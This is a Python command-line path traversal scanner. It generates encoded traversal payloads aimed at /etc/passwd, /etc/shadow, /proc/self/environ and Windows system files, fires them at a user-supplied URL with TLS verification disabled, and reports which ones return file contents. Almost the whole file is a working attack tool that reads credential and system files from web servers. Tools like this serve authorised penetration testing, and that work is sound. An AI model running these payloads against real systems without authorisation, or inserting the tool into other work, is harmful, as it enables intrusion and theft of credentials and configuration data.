#!/usr/bin/env python3
"""Simple path traversal checker."""
import argparse
import sys
import requests

# Common traversal patterns
TRAVERSAL_PATTERNS = [
    "../", "..\\",
    "....//", "....\\\\",
    "%2e%2e%2f", "%2e%2e/", "..%2f",
    "%2e%2e%5c", "%2e%2e\\", "..%5c",
    "..%252f", "%252e%252e%252f",
    "..%c0%af", "..%c1%9c",
    "..%25c0%25af",
    "..;/",
    "..\\/",
]

# Target files to detect
UNIX_FILES = [
    "etc/passwd",
    "etc/shadow",
    "etc/hosts",
    "proc/self/environ",
    "proc/version",
]

WIN_FILES = [
    "windows/system32/drivers/etc/hosts",
    "windows/win.ini",
    "boot.ini",
]

# Common injection points (path segments)
INJECT_PATHS = [
    "/",
    "/file=",
    "/page=",
    "/path=",
    "/include=",
    "/doc=",
    "/document=",
    "/folder=",
    "/root=",
    "/dir=",
    "/load=",
    "/read=",
    "/template=",
    "/view=",
    "/content=",
    "/cat=",
    "/action=",
]

# Signatures that confirm successful traversal
UNIX_SIGNATURES = ["root:x:", "root:0:0", "daemon:", "[boot loader]"]
WIN_SIGNATURES = ["[fonts]", "[extensions]", "[boot loader]", "for 16-bit app support"]


def build_payloads(depth=6):
    """Build traversal payloads combining patterns with target files."""
    payloads = []
    files = UNIX_FILES + WIN_FILES

    for pattern in TRAVERSAL_PATTERNS:
        for d in range(1, depth + 1):
            traversal = pattern * d
            for target_file in files:
                payloads.append(traversal + target_file)
    return payloads


def check_traversal(base_url, path, payload, timeout):
    """Test a single traversal payload."""
    if "=" in path:
        url = f"{base_url}{path}{payload}"
    else:
        url = f"{base_url}{path}{payload}"

    try:
        resp = requests.get(url, timeout=timeout, verify=False, allow_redirects=False,
                            headers={"User-Agent": "PhantomStrike/1.0"})
        if resp.status_code == 200:
            body = resp.text
            for sig in UNIX_SIGNATURES + WIN_SIGNATURES:
                if sig in body:
                    return True, resp.status_code, sig, url
        return False, resp.status_code, None, url
    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
        return False, 0, None, url


def main():
    parser = argparse.ArgumentParser(description="Path traversal checker")
    parser.add_argument("target", help="Target URL (e.g., http://example.com)")
    parser.add_argument("-d", "--depth", type=int, default=5, help="Traversal depth")
    parser.add_argument("-t", "--timeout", type=int, default=5, help="Request timeout")
    parser.add_argument("-v", "--verbose", action="store_true", help="Show all attempts")
    parser.add_argument("--paths", nargs="+", help="Custom injection paths")
    args = parser.parse_args()

    target = args.target.rstrip("/")
    if not target.startswith("http"):
        target = f"http://{target}"

    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    payloads = build_payloads(args.depth)
    paths = args.paths or INJECT_PATHS
    total = len(payloads) * len(paths)
    vulns = []

    print(f"[*] Path traversal scan: {target}")
    print(f"[*] Payloads: {len(payloads)}, Injection points: {len(paths)}")
    print(f"[*] Total requests: {total}\n")

    tested = 0
    for path in paths:
        for payload in payloads:
            tested += 1
            found, status, sig, url = check_traversal(target, path, payload, args.timeout)
            if found:
                print(f"  [VULN] Path traversal found!")
                print(f"         URL: {url}")
                print(f"         Signature: {sig}")
                print(f"         Status: {status}")
                vulns.append({"url": url, "signature": sig, "status": status})
            elif args.verbose and status > 0:
                print(f"  [----] {status} | {url[:100]}")

            if tested % 100 == 0:
                sys.stdout.write(f"\r  [{tested}/{total}] tested...")
                sys.stdout.flush()

    print(f"\n\n[*] Scan complete: {tested} requests sent")
    if vulns:
        print(f"\n[!] VULNERABLE - {len(vulns)} path traversal(s) found:")
        for v in vulns:
            print(f"    {v['url']}")
            print(f"    Matched: {v['signature']}")
    else:
        print("[*] No path traversal vulnerabilities found")


if __name__ == "__main__":
    main()
